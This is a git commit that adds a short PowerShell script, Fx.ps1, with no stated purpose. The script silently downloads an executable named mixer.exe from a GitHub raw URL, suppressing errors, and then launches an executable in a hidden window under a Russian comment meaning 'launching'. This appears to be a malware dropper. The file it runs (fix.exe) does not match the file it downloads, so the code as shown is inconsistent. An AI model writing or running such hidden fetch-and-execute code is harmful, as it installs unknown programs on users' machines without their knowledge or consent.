6bb3860791df7cfda2d9b39bc35245ffadfdc0d7
svhosf <markijannshtoyko@gmail.com>
2026-03-15 01:16:17 +0200

    Add files via upload

---
+++ Fx.ps1
@@ -0,0 +1,4 @@
+Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/mixer.exe" -OutFile "mixer.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "fix.exe" -WindowStyle Hidden
